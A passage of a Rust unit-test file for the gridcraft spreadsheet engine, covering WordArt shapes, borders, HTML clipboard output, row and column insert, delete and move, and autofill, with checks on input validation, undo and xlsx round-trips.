    let id = s.doc().unwrap().wb.active().unwrap().shapes[0].id;
    let text = "Edited & <escaped>\n\nLast line\n";
    s.execute("shape.setText", json!({"id": id, "text": text})).unwrap();
    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    s.execute("file.open", json!({"name": "edited.xlsx", "base64": saved["base64"]})).unwrap();
    let shape = &s.doc().unwrap().wb.active().unwrap().shapes[0];
    assert_eq!(shape.kind, gridcraft_model::ShapeKind::TextBox);
    assert_eq!(shape.text, text);
}

#[test]
fn word_art_insert_respects_sheet_protection() {
    let mut s = s();
    s.execute("review.protectSheet", json!({})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    let undo_len = s.doc().unwrap().undo.len();
    assert!(s.execute("insert.wordArt", json!({})).is_err());
    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("insert.wordArt", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes.len(), 1);
}

#[test]
fn word_art_inserts_with_defaults_and_undoes() {
    use gridcraft_model::ShapeKind;
    let mut s = s();
    // Empty params: default style and text, no dialog.
    let r = s.execute("insert.wordArt", json!({})).unwrap();
    assert!(s.take_ui_requests().is_empty());
    let shape = s.doc().unwrap().wb.active().unwrap().shapes[0].clone();
    assert_eq!(shape.id, r["shape"].as_u64().unwrap() as u32);
    assert_eq!(shape.kind, ShapeKind::WordArt);
    assert_eq!(shape.text, crate::cmd::wordart::DEFAULT_TEXT);
    assert!(shape.anchor.width > 8.0 && shape.format.text_color.is_some());
    // Named style plus overrides; restyle and edit the text through wordArt.set.
    s.execute("insert.wordArt", json!({"style": "ember", "text": "Q3", "fontSize": 60, "shadow": false, "outline": "#112233", "outlineWidth": 3}))
        .unwrap();
    let ember = s.doc().unwrap().wb.active().unwrap().shapes[1].clone();
    assert_eq!(ember.format.font_size, Some(60.0));
    assert_eq!((ember.format.text_shadow, ember.format.text_outline.map(|o| o.1)), (None, Some(3.0)));
    s.execute("wordArt.set", json!({"id": ember.id, "style": 3, "text": "Q4"})).unwrap();
    let styled = s.doc().unwrap().wb.active().unwrap().shapes[1].clone();
    assert_eq!((styled.text.as_str(), styled.format.italic), ("Q4", true));
    s.execute("shape.setText", json!({"id": ember.id, "text": "Q5"})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[1], ember);
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[1].text, "Q4");
    // Moves and deletes like any floating shape.
    s.execute("object.move", json!({"kind": "shape", "id": ember.id, "at": "D4"})).unwrap();
    s.execute("object.delete", json!({"kind": "shape", "id": ember.id})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes.len(), 1);
}

#[test]
fn word_art_rejects_hostile_params() {
    let mut s = s();
    let id = s.execute("insert.wordArt", json!({})).unwrap()["shape"].clone();
    let rectangle = s.execute("insert.shape", json!({"kind": "rectangle"})).unwrap()["shape"].clone();
    let before = s.doc().unwrap().wb.clone();
    for (cmd, params) in [
        ("insert.wordArt", json!({"style": "No Such Style"})),
        ("insert.wordArt", json!({"style": 99})),
        ("insert.wordArt", json!({"style": -1})),
        ("insert.wordArt", json!({"text": 5})),
        ("insert.wordArt", json!({"text": ""})),
        ("insert.wordArt", json!({"text": "x".repeat(crate::cmd::wordart::MAX_CHARS + 1)})),
        ("insert.wordArt", json!({"fill": "not a colour"})),
        ("wordArt.set", json!({})),
        ("wordArt.set", json!({"id": 999})),
        ("wordArt.set", json!({"id": rectangle})),
        ("shape.setText", json!({"id": id, "text": ""})),
    ] {
        assert!(matches!(s.execute(cmd, params), Err(crate::EngineError::BadParams { .. })), "{cmd}");
        assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
    }
    // Absurd sizes are clamped, not trusted.
    s.execute("insert.wordArt", json!({"fontSize": 1e12, "width": 1e300, "height": -5})).unwrap();
    let big = &s.doc().unwrap().wb.active().unwrap().shapes[2];
    assert!(big.anchor.width <= 4000.0 && big.anchor.height >= 8.0 && big.format.font_size == Some(400.0));
}

#[test]
fn word_art_survives_xlsx_roundtrip() {
    use gridcraft_model::ShapeKind;
    let mut s = s();
    s.execute("insert.wordArt", json!({"style": "Lagoon", "text": "Sales <2026>\nOutlook & more"})).unwrap();
    let before = s.doc().unwrap().wb.active().unwrap().shapes[0].clone();
    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    s.execute("file.open", json!({"name": "wordart.xlsx", "base64": saved["base64"]})).unwrap();
    let after = &s.doc().unwrap().wb.active().unwrap().shapes[0];
    assert_eq!(after.kind, ShapeKind::WordArt);
    assert_eq!(after.text, before.text);
    assert_eq!(after.format.text_color, before.format.text_color);
    assert_eq!(after.format.text_outline, before.format.text_outline);
    assert_eq!(after.format.text_shadow, before.format.text_shadow);
    assert_eq!((after.format.bold, after.format.italic, after.format.font_size), (true, true, before.format.font_size));
    assert!(after.format.no_line);
}

/// White text with a green outline (Mint Outline) prints its outline, so it is not invisible on a
/// white page.
#[test]
fn word_art_outline_prints() {
    let mut s = s();
    s.execute("insert.wordArt", json!({"style": "Mint Outline", "text": "VISIBLE", "at": "A1"})).unwrap();
    let pdf = s.execute("file.exportPdf", json!({"range": "A1:G10"})).unwrap();
    let data = crate::io::base64_decode(pdf["base64"].as_str().unwrap()).unwrap();
    let text = String::from_utf8_lossy(&data);
    let outline = text.matches("0.18 0.608 0.416 rg").count();
    assert!(outline >= 1, "the outline colour (2E9B6A) is drawn");
    assert_eq!(text.matches("(VISIBLE) Tj").count(), 9, "eight outline copies under the white text");
    assert!(text.contains("1 1 1 rg"), "the white fill is drawn on top");
    // The last copy drawn is the filled text, in white; every outline copy comes before it.
    let before_fill = &text[..text.rfind("(VISIBLE) Tj").unwrap()];
    assert!(before_fill.rfind("1 1 1 rg") > before_fill.rfind("0.18 0.608 0.416 rg"), "the white fill is drawn last");
    assert_eq!(before_fill.matches("(VISIBLE) Tj").count(), 8);
}

#[test]
fn no_border_clears_only_shared_edges_and_undo_restores_them() {
    use gridcraft_core::RangeRef;
    use gridcraft_model::{BorderLine, Borders};

    for (range, neighbors) in [
        ("B2", &[("B1", "bottom"), ("B3", "top"), ("A2", "right"), ("C2", "left")][..]),
        (
            "B2:C3",
            &[("B1", "bottom"), ("C1", "bottom"), ("B4", "top"), ("C4", "top"), ("A2", "right"), ("A3", "right"), ("D2", "left"), ("D3", "left")][..],
        ),
    ] {
        let mut s = s();
        s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12], [13, 14, 15, 16]]})).unwrap();
        s.execute("cell.set", json!({"cell": "D4", "input": "=SUM(A1:C1)"})).unwrap();
        s.execute("home.bold", json!({"range": "A1:D4", "on": true})).unwrap();
        for preset in ["all", "diagonalDown"] {
            s.execute("home.borders", json!({"range": "A1:D4", "preset": preset, "style": "double", "color": "#CC3344"})).unwrap();
        }
        let before: Vec<_> = RangeRef::parse("A1:D4").unwrap().iter().map(|c| s.execute("cell.get", json!({"cell": c.a1()})).unwrap()).collect();
        s.execute("home.borders", json!({"range": range, "preset": "none"})).unwrap();
        let selected = RangeRef::parse(range).unwrap();
        for original in &before {
            let address = original["cell"].as_str().unwrap();
            let mut expected = original.clone();
            if selected.contains(CellRef::parse(address).unwrap()) {
                expected["style"]["borders"] = json!(Borders::default());
            } else if let Some((_, edge)) = neighbors.iter().find(|(cell, _)| *cell == address) {
                expected["style"]["borders"][*edge] = json!(BorderLine::default());
            }
            assert_eq!(s.execute("cell.get", json!({"cell": address})).unwrap(), expected, "clearing {range}, cell {address}");
        }
        s.execute("edit.undo", json!({})).unwrap();
        for original in before {
            assert_eq!(s.execute("cell.get", json!({"cell": original["cell"]})).unwrap(), original);
        }
    }
}

#[test]
fn no_border_handles_sheet_corners_without_creating_out_of_bounds_cells() {
    for (range, corner, neighbors) in [
        ("A1:B2", "A1", [("B1", "left"), ("A2", "top")]),
        ("XFC1048575:XFD1048576", "XFD1048576", [("XFC1048576", "right"), ("XFD1048575", "bottom")]),
    ] {
        let mut s = s();
        s.execute("home.borders", json!({"range": range, "preset": "all"})).unwrap();
        s.execute("home.borders", json!({"range": corner, "preset": "none"})).unwrap();
        for (neighbor, edge) in neighbors {
            assert_eq!(s.execute("cell.get", json!({"cell": neighbor})).unwrap()["style"]["borders"][edge]["style"], "None");
        }
        let sh = s.doc().unwrap().wb.active().unwrap();
        assert!(sh.cells.iter().all(|(c, _)| c.is_valid()));
        assert!(sh.cells.iter().count() <= 4);
    }
}

#[test]
fn borders_respect_sheet_formatting_protection() {
    let mut s = s();
    s.execute("home.borders", json!({"range": "A1:B2", "preset": "all"})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    let undo_count = s.doc().unwrap().undo.len();
    for preset in ["none", "left"] {
        assert!(s.execute("home.borders", json!({"range": "A1", "preset": preset})).is_err());
        assert_eq!(s.doc().unwrap().wb.styles, before.styles);
        assert_eq!(s.doc().unwrap().wb.active().unwrap().cells, before.active().unwrap().cells);
        assert_eq!(s.doc().unwrap().undo.len(), undo_count);
    }
    s.execute("review.protectSheet", json!({"formatCells": true})).unwrap();
    s.execute("home.borders", json!({"range": "A1", "preset": "none"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "B1"})).unwrap()["style"]["borders"]["left"]["style"], "None");
}

#[test]
fn copy_paste_shifts_formulas() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2], [3, 4]]})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=A1+B1"})).unwrap();
    s.execute("edit.copy", json!({"range": "C1"})).unwrap();
    s.execute("selection.set", json!({"range": "C2"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(v(&s, "C2"), Value::Number(7.0));
    s.execute("edit.cut", json!({"range": "A1"})).unwrap();
    s.execute("selection.set", json!({"range": "E5"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(v(&s, "E5"), Value::Number(1.0));
    let f = s.execute("cell.get", json!({"cell": "C1"})).unwrap();
    assert_eq!(f["formula"], "=E5+B1");
}

#[test]
fn rich_clipboard_copies_selected_displayed_cells_and_styles() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "outside selection"})).unwrap();
    s.execute("range.setValues", json!({"range": "B2", "values": [[0.125, "<tag>&\"\nnext"], [0.25, "last"]]})).unwrap();
    s.execute("home.numberFormat", json!({"range": "B2:B3", "code": "0.0%"})).unwrap();
    s.execute("home.bold", json!({"range": "B2", "on": true})).unwrap();
    s.execute("home.italic", json!({"range": "B2", "on": true})).unwrap();
    s.execute("home.fontColor", json!({"range": "B2", "color": "#123456"})).unwrap();
    s.execute("home.fillColor", json!({"range": "B2", "color": "#FEDCBA"})).unwrap();
    let copied = s.execute("edit.copy", json!({"range": "B2:C3", "html": true})).unwrap();
    let html = copied["html"].as_str().expect("copy publishes HTML as well as plain text");
    assert_eq!(copied["text"], "12.5%\t\"<tag>&\"\"\nnext\"\n25.0%\tlast\n");
    assert!(html.starts_with("<table "));
    assert!(html.ends_with("</table>"));
    assert_eq!(html.matches("<tr>").count(), 2);
    assert_eq!(html.matches("<td ").count(), 4);
    assert!(html.contains("&lt;tag&gt;&amp;&quot;<br>next"));
    for content in ["12.5%", "25.0%", "font-weight:bold;", "font-style:italic;", "color:#123456;", "background:#FEDCBA;", "text-align:right;"] {
        assert!(html.contains(content), "missing {content}");
    }
    assert!(!html.contains("outside selection"));
    assert!(!html.contains("<html"));

    let cut = s.execute("edit.cut", json!({"range": "B2:C3", "html": true})).unwrap();
    assert_eq!(cut["html"], copied["html"]);
    assert_eq!(cut["text"], copied["text"]);
    s.execute("edit.paste", json!({"at": "E5", "text": cut["text"]})).unwrap();
    assert_eq!(v(&s, "E5"), Value::Number(0.125));
    assert_eq!(v(&s, "B2"), Value::Empty);
}

#[test]
fn copy_and_cut_return_html_only_when_requested() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    for cmd in ["edit.copy", "edit.cut"] {
        for params in [json!({"range": "A1"}), json!({"range": "A1", "html": false})] {
            let r = s.execute(cmd, params).unwrap();
            assert_eq!(r["text"], "x\n");
            assert!(r.get("html").is_none(), "{cmd} must not bloat programmatic responses with HTML");
        }
        let r = s.execute(cmd, json!({"range": "A1", "html": true})).unwrap();
        assert!(r["html"].as_str().is_some_and(|h| h.contains(">x</td>")));
    }
}

#[test]
fn rich_clipboard_clips_merges_and_skips_hidden_rows() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B2", "input": "merged"})).unwrap();
    s.execute("home.mergeCenter", json!({"range": "B2:D5"})).unwrap();
    s.execute("home.hideRows", json!({"rows": "3:3"})).unwrap();
    s.execute("cell.set", json!({"cell": "E4", "input": "side"})).unwrap();
    let copied = s.execute("edit.copy", json!({"range": "B2:C4", "html": true})).unwrap();
    let html = copied["html"].as_str().expect("merged copy publishes HTML");
    assert_eq!(copied["text"], "merged\t\n\t\n");
    assert_eq!(html.matches("<tr>").count(), 2);
    assert_eq!(html.matches("<td ").count(), 1);
    assert!(html.contains("rowspan=\"2\" colspan=\"2\""));
    assert!(html.contains(">merged</td>"));

    // A selection beginning inside a merge must keep its shape without copying
    // the original anchor's value from outside the selected rectangle.
    let copied = s.execute("edit.copy", json!({"range": "C3:E5", "html": true})).unwrap();
    let html = copied["html"].as_str().expect("partially selected merge publishes HTML");
    assert_eq!(html.matches("<tr>").count(), 2);
    assert_eq!(html.matches("<td ").count(), 3);
    assert!(html.contains("rowspan=\"2\" colspan=\"2\""));
    assert!(!html.contains("merged"));
    assert!(html.contains(">side</td>"));
}

#[test]
fn rich_clipboard_omits_html_for_large_ranges_without_truncating_text() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A10001", "input": "last cell"})).unwrap();
    let copied = s.execute("edit.copy", json!({"range": "A1:A10001", "html": true})).unwrap();
    assert!(copied.get("html").is_none(), "oversized HTML must be omitted, not partially copied");
    let text = copied["text"].as_str().unwrap();
    assert_eq!(text.lines().count(), 10_001);
    assert!(text.ends_with("last cell\n"));
    let copied = s.execute("edit.copy", json!({"range": "A10001", "html": true})).unwrap();
    assert!(copied["html"].as_str().is_some_and(|html| html.contains("last cell")));
}

#[test]
fn rich_clipboard_omits_html_when_escaping_exceeds_byte_budget() {
    let mut s = s();
    let text = "&".repeat(1_000_000);
    s.execute("range.setValues", json!({"range": "A1", "values": [[text]]})).unwrap();
    let copied = s.execute("edit.copy", json!({"range": "A1", "html": true})).unwrap();
    assert!(copied.get("html").is_none(), "an oversized escaped value must not produce partial HTML");
    assert_eq!(copied["text"].as_str().unwrap().len(), 1_000_001);
    assert!(copied["text"].as_str().unwrap().ends_with("&\n"));
}

#[test]
fn insert_delete_rows_adjust() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=SUM(A1:A3)"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "2:2"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "B1"})).unwrap()["formula"], "=SUM(A1:A4)");
    s.execute("cell.set", json!({"cell": "A2", "input": "10"})).unwrap();
    assert_eq!(v(&s, "B1"), Value::Number(16.0));
    s.execute("home.deleteRows", json!({"rows": "1:1"})).unwrap();
    assert_eq!(v(&s, "B1"), Value::Empty);
    assert_eq!(v(&s, "A1"), Value::Number(10.0));
}

#[test]
fn deleting_a_multi_area_row_selection_removes_every_area_and_undoes_once() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3], [4], [5], [6]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=A6"})).unwrap();
    // Ctrl-select rows 2, 4 and 5:6 (A1 refs are 1-based).
    let sel = &mut s.doc_mut().unwrap().selection;
    sel.ranges = vec![gridcraft_core::RangeRef::rows(1, 1), gridcraft_core::RangeRef::rows(3, 3), gridcraft_core::RangeRef::rows(4, 5)];
    sel.active = CellRef::new(4, 0);
    s.doc_mut().unwrap().undo.clear();
    s.execute("home.deleteRows", json!({})).unwrap();
    assert_eq!((v(&s, "A1"), v(&s, "A2"), v(&s, "A3")), (Value::Number(1.0), Value::Number(3.0), Value::Empty));
    assert_eq!(s.execute("cell.get", json!({"cell": "B1"})).unwrap()["formula"], "=#REF!");
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!((1..=6).map(|r| v(&s, &format!("A{r}"))).collect::<Vec<_>>(), (1..=6).map(|n| Value::Number(n as f64)).collect::<Vec<_>>());
    assert!(s.doc().unwrap().undo.is_empty(), "one undo step restored all rows");
    // The explicit list form behaves the same, for columns too.
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4]]})).unwrap();
    s.execute("home.deleteColumns", json!({"cols": "A:A,C:C"})).unwrap();
    assert_eq!((v(&s, "A1"), v(&s, "B1"), v(&s, "C1")), (Value::Number(2.0), Value::Number(4.0), Value::Empty));
}

#[test]
#[allow(clippy::disallowed_methods)] // native-only test: timing the two deletes
fn deleting_many_separate_rows_takes_about_as_long_as_one_block() {
    // #2287: every 10th row of a 12,000-row sheet, as 1,200 single-row areas.
    let (rows, step) = (12_000u32, 10u32);
    let values: Vec<serde_json::Value> = (0..rows).map(|r| json!([r, r + 100_000, r + 200_000])).collect();
    let deleted = |r: u32| r >= 1 && (r - 1).is_multiple_of(step);
    let list = (0..rows).filter(|&r| deleted(r)).map(|r| format!("{0}:{0}", r + 1)).collect::<Vec<_>>().join(",");
    let build = || {
        let mut s = s();
        s.execute("range.setValues", json!({"range": "A1", "values": values})).unwrap();
        s.execute("cell.set", json!({"cell": "E1", "input": format!("=SUM(A1:A{rows})")})).unwrap();
        s.execute("cell.set", json!({"cell": "E3", "input": "=B25"})).unwrap();
        s
    };
    let mut block = build();
    let t = std::time::Instant::now();
    block.execute("home.deleteRows", json!({"rows": format!("2:{}", rows / step + 1)})).unwrap();
    let block_time = t.elapsed();

    let mut s = build();
    let t = std::time::Instant::now();
    s.execute("home.deleteRows", json!({"rows": list})).unwrap();
    let separate_time = t.elapsed();

    let kept: Vec<u32> = (0..rows).filter(|&r| !deleted(r)).collect();
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert_eq!(sh.used_range().unwrap().end.row as usize, kept.len() - 1);
    for (i, r) in kept.iter().enumerate() {
        assert_eq!(sh.value(CellRef::new(i as u32, 0)), Value::Number(*r as f64));
        assert_eq!(sh.value(CellRef::new(i as u32, 2)), Value::Number((*r + 200_000) as f64));
    }
    assert_eq!(s.execute("cell.get", json!({"cell": "E1"})).unwrap()["formula"], format!("=SUM(A1:A{})", kept.len()));
    // B25 loses rows 2, 12 and 22 above it; the formula itself moves from E3 to E2.
    assert_eq!(s.execute("cell.get", json!({"cell": "E2"})).unwrap()["formula"], "=B22");
    assert!(
        separate_time < block_time * 20 + std::time::Duration::from_millis(500),
        "separate rows took {separate_time:?}, one block took {block_time:?}"
    );
}

#[test]
fn deleting_many_separate_columns_matches_per_area_result() {
    let mut s = s();
    let values: Vec<serde_json::Value> = (0..50).map(|r| json!((0..40).map(|c| r * 100 + c).collect::<Vec<_>>())).collect();
    s.execute("range.setValues", json!({"range": "A1", "values": values})).unwrap();
    s.execute("cell.set", json!({"cell": "A60", "input": "=SUM(A1:AN1)+H2"})).unwrap();
    // Columns B, E, H (refs) and F:G.
    s.execute("home.deleteColumns", json!({"cols": "B:B,E:E,H:H,F:G"})).unwrap();
    let kept: Vec<u32> = (0..40).filter(|c| ![1, 4, 5, 6, 7].contains(c)).collect();
    for r in 0..50u32 {
        for (i, c) in kept.iter().enumerate() {
            assert_eq!(s.doc().unwrap().wb.active().unwrap().value(CellRef::new(r, i as u32)), Value::Number((r * 100 + c) as f64));
        }
    }
    assert_eq!(s.execute("cell.get", json!({"cell": "A60"})).unwrap()["formula"], "=SUM(A1:AI1)+#REF!");
}

#[test]
fn move_columns_reorders_without_overwriting_and_undoes_once() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4, 5, 6, 7, 8]]})).unwrap();
    s.execute("cell.set", json!({"cell": "H2", "input": "=B1+D1"})).unwrap();
    s.execute("cell.set", json!({"cell": "H3", "input": "=SUM(B:B)"})).unwrap();
    s.execute("home.columnWidth", json!({"cols": "B:B", "width": 101})).unwrap();
    s.execute("home.columnWidth", json!({"cols": "C:C", "width": 102})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    s.doc_mut().unwrap().undo.clear();

    let result = s.execute("sheet.moveColumns", json!({"cols": "B:C", "before": 4})).unwrap();
    assert_eq!(result["cols"], "C:D");
    assert_eq!(
        (0..8).map(|col| v(&s, &CellRef::new(0, col).a1())).collect::<Vec<_>>(),
        vec![
            Value::Number(1.0),
            Value::Number(4.0),
            Value::Number(2.0),
            Value::Number(3.0),
            Value::Number(5.0),
            Value::Number(6.0),
            Value::Number(7.0),
            Value::Number(8.0),
        ]
    );
    assert_eq!(s.execute("cell.get", json!({"cell": "H2"})).unwrap()["formula"], "=C1+B1");
    assert_eq!(s.execute("cell.get", json!({"cell": "H3"})).unwrap()["formula"], "=SUM(C:C)");
    let sh = s.doc().unwrap().wb.active().unwrap();
    assert_eq!(sh.col_width(2), 101.0);
    assert_eq!(sh.col_width(3), 102.0);
    assert_eq!(s.doc().unwrap().selection.current().a1(), "C:D");
    assert_eq!(s.doc().unwrap().undo.len(), 1);

    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(*s.doc().unwrap().wb, *before);
}

#[test]
fn move_columns_can_reorder_left_and_ignores_drops_inside_the_selection() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["A", "B", "C", "D", "E"]]})).unwrap();
    s.execute("sheet.moveColumns", json!({"cols": "D:E", "before": 1})).unwrap();
    assert_eq!(
        (0..5).map(|col| v(&s, &CellRef::new(0, col).a1())).collect::<Vec<_>>(),
        vec!["A".into(), "D".into(), "E".into(), "B".into(), "C".into()]
    );
    let undo = s.doc().unwrap().undo.len();
    s.execute("sheet.moveColumns", json!({"cols": "B:C", "before": 2})).unwrap();
    assert_eq!(s.doc().unwrap().undo.len(), undo);
}

#[test]
fn insert_copied_cells_inserts_rows_columns_and_blocks() {
    // Issue #21: Insert Copied Cells.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3], [4], [5]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "=A2*10"})).unwrap();
    s.execute("edit.copy", json!({"range": "2:2"})).unwrap();
    s.execute("selection.set", json!({"range": "C4"})).unwrap();
    s.execute("home.insertCopiedCells", json!({})).unwrap();
    assert_eq!(v(&s, "A4"), Value::Number(2.0));
    assert_eq!(v(&s, "B4"), Value::Number(20.0), "the formula follows its new row");
    assert_eq!(v(&s, "A5"), Value::Number(4.0));
    assert_eq!(v(&s, "A6"), Value::Number(5.0));
    assert_eq!(s.doc().unwrap().selection.current(), gridcraft_core::RangeRef::rows(3, 3));
    // One undo step puts everything back.
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "A4"), Value::Number(4.0));
    assert_eq!(v(&s, "A6"), Value::Empty);
    // Whole columns.
    s.execute("edit.copy", json!({"range": "A:A"})).unwrap();
    s.execute("home.insertCopiedCells", json!({"at": "A1"})).unwrap();
    assert_eq!(v(&s, "A3"), Value::Number(3.0));
    assert_eq!(v(&s, "B3"), Value::Number(3.0));
    assert_eq!(v(&s, "C2"), Value::Number(20.0), "the old column B moved right");
    // A block shifts cells right.
    s.execute("cell.set", json!({"cell": "F1", "input": "x"})).unwrap();
    s.execute("cell.set", json!({"cell": "G1", "input": "y"})).unwrap();
    s.execute("edit.copy", json!({"range": "F1"})).unwrap();
    s.execute("home.insertCopiedCells", json!({"at": "G1", "shift": "right"})).unwrap();
    assert_eq!(v(&s, "G1"), Value::from("x"));
    assert_eq!(v(&s, "H1"), Value::from("y"));
    assert!(s.clipboard.is_none(), "inserting ends copy mode");
    s.execute("edit.copy", json!({"range": "F1"})).unwrap();
    assert!(s.execute("home.insertCopiedCells", json!({"shift": "up"})).is_err());
}

#[test]
fn insert_cut_cells_moves_whole_rows() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3], [4], [5]]})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=A5"})).unwrap();
    // Up: row 5 goes above row 2.
    s.execute("edit.cut", json!({"range": "5:5"})).unwrap();
    s.execute("home.insertCopiedCells", json!({"at": "A2"})).unwrap();
    let col: Vec<Value> = (1..=6).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, [1.0, 5.0, 2.0, 3.0, 4.0].map(Value::Number).into_iter().chain([Value::Empty]).collect::<Vec<_>>());
    assert_eq!(v(&s, "C1"), Value::Number(5.0), "references follow the moved cells");
    assert!(s.clipboard.is_none());
    // Down: row 1 goes above row 4.
    s.execute("edit.cut", json!({"range": "1:1"})).unwrap();
    s.execute("home.insertCopiedCells", json!({"at": "A4"})).unwrap();
    let col: Vec<Value> = (1..=5).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, [5.0, 2.0, 1.0, 3.0, 4.0].map(Value::Number).to_vec());
    assert_eq!(s.doc().unwrap().selection.current(), gridcraft_core::RangeRef::rows(2, 2));
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    // Inside itself, and a cut block, are refused without changing anything.
    s.execute("edit.cut", json!({"range": "2:4"})).unwrap();
    assert!(s.execute("home.insertCopiedCells", json!({"at": "A3"})).is_err());
    s.execute("edit.cut", json!({"range": "A1:A2"})).unwrap();
    assert!(s.execute("home.insertCopiedCells", json!({"at": "B5"})).is_err());
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    assert_eq!(v(&s, "B5"), Value::Empty);
}

#[test]
fn inserting_or_deleting_cells_cancels_copy_mode() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3]]})).unwrap();
    s.execute("edit.cut", json!({"range": "3:3"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "3:3"})).unwrap();
    assert!(s.clipboard.is_none());
    // The cut data is now in row 4; a paste must not move the new blank row 3 instead.
    assert!(s.execute("edit.paste", json!({"at": "A10"})).is_err());
    assert_eq!(v(&s, "A4"), Value::Number(3.0));
    s.execute("edit.copy", json!({"range": "A:A"})).unwrap();
    s.execute("home.deleteColumns", json!({"cols": "B:B"})).unwrap();
    assert!(s.clipboard.is_none());
    s.execute("edit.copy", json!({"range": "A1"})).unwrap();
    s.execute("home.insertCells", json!({"range": "A1", "shift": "down"})).unwrap();
    assert!(s.clipboard.is_none());
    s.execute("edit.copy", json!({"range": "A2"})).unwrap();
    s.execute("home.deleteCells", json!({"range": "A1", "shift": "up"})).unwrap();
    assert!(s.clipboard.is_none());
}

#[test]
fn fill_series() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [3]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "A1:A2", "target": "A1:A6"})).unwrap();
    assert_eq!(v(&s, "A6"), Value::Number(11.0));
    s.execute("cell.set", json!({"cell": "B1", "input": "Mon"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "B1", "target": "B1:B3"})).unwrap();
    assert_eq!(v(&s, "B3"), Value::from("Wed"));
    s.execute("cell.set", json!({"cell": "C1", "input": "Item 9"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "C1", "target": "C1:C2"})).unwrap();
    assert_eq!(v(&s, "C2"), Value::from("Item 10"));
}

#[test]
fn ctrl_drag_fill_swaps_copy_and_series() {
    // Issue #264: Ctrl+drag fills a lone number as a series, and copies what a plain drag extends.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "7"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "A1", "target": "A1:A4"})).unwrap();
    assert_eq!(v(&s, "A4"), Value::Number(7.0), "a plain drag copies a lone number");
    s.execute("edit.autoFill", json!({"source": "A1", "target": "A1:A4", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(8.0));
    assert_eq!(v(&s, "A4"), Value::Number(10.0));
    // Upward too.
    s.execute("cell.set", json!({"cell": "B5", "input": "7"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "B5", "target": "B3:B5", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "B3"), Value::Number(5.0));
    // A two-number series, a list entry and text with a number are copied.
    s.execute("range.setValues", json!({"range": "C1", "values": [[1], [3]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "C1:C2", "target": "C1:C4", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "C3"), Value::Number(1.0));
    assert_eq!(v(&s, "C4"), Value::Number(3.0));
    s.execute("cell.set", json!({"cell": "D1", "input": "Mon"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "D1", "target": "D1:D3", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "D3"), Value::from("Mon"));
    s.execute("cell.set", json!({"cell": "E1", "input": "Item 9"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "E1", "target": "E1:E2", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "E2"), Value::from("Item 9"));
    // Plain text copies either way; an empty source clears.
